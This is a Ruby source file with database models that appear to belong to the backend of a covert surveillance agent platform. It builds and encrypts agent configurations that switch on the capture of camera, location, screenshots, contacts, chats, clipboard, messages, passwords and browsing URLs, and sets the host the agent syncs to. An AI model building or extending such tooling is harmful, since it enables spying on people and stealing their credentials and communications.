require 'mongoid'

require 'rcs-common/crypt'
require 'json'

#module RCS
#module DB

class Configuration
  include Mongoid::Document
  include Mongoid::Timestamps
  include RCS::Crypt

  field :desc, type: String
  field :user, type: String
  field :saved, type: Integer
  field :sent, type: Integer
  field :activated, type: Integer

  field :config, type: String   #json
  
  embedded_in :item

  def encrypted_config(confkey)
    # encrypt the config for the agent using the confkey
    aes_encrypt(self.config.force_encoding('ASCII-8BIT') + Digest::SHA1.digest(self.config), Digest::MD5.digest(confkey))
  end

  def encrypted_soldier_config(confkey)
    # encrypt the config for the agent using the confkey
    aes_encrypt(self.soldier_config.force_encoding('ASCII-8BIT') + Digest::SHA1.digest(self.soldier_config), Digest::MD5.digest(confkey))
  end

  def soldier_config
    # default config
    conf = {camera: {enabled: false, repeat: 0, iter: 0},
            position: {enabled: false, repeat: 0},
            screenshot: {enabled: false, repeat: 0},
            addressbook: {enabled: false},
            chat: {enabled: false},
            clipboard: {enabled: false},
            device: {enabled: false},
            messages: {enabled: false},
            password: {enabled: false},
            url: {enabled: false},
            sync: {host: "127.0.0.1", repeat: 0}}

    # extract the sync host
    conf[:sync][:host] = sync_host

    # enable each module
    conf.keys.each do |key|
      next if key.eql? :sync
      conf[key][:enabled] = self.__send__("#{key}_enabled?")
    end

    # retrieve parameters for enabled modules
    conf.keys.each do |key|
      next unless conf[key].has_key? :repeat
      params = _params(key.to_s)
      conf[key][:repeat] = params[:repeat] || 0
      conf[key][:iter] = params[:iter] || 0 if key.eql? :camera
    end

    conf.to_json
  end

  def sync_host
    # search for the first sync action and take the sync address
    config = JSON.parse(self.config)
    config['actions'].each do |action|
      action['subactions'].each do |sub|
        if sub['action'] == 'synchronize'
          return sub['host']
        end
      end
    end
    return nil
  end

  def method_missing(meth, *args, &block)
    if meth.to_s =~ /^(.+)_enabled?/
      _enabled?($1)
    else
      super
    end
  end

  def _enabled?(module_name)
    # search for the configuration of the specified module
    config = JSON.parse(self.config)
    config['actions'].each do |action|
      action['subactions'].each do |sub|
        if sub['action'] == 'module' and sub['status'] == 'start' and sub['module'] == module_name
          return true
        end
      end
    end
    return false
  end

  def _params(module_name)
    # search for the configuration of the specified module
    config = JSON.parse(self.config)
    config['events'].each do |event|
      if event['desc'].eql? module_name.upcase
        return {repeat: event['delay'], iter: event['iter']}
      end
    end
    return {}
  end

end


class Template
  include Mongoid::Document
  include Mongoid::Timestamps

  field :desc, type: String
  field :user, type: String

  field :config, type: String   #json

  store_in collection: 'templates'
end


#end # ::DB
#end # ::RCS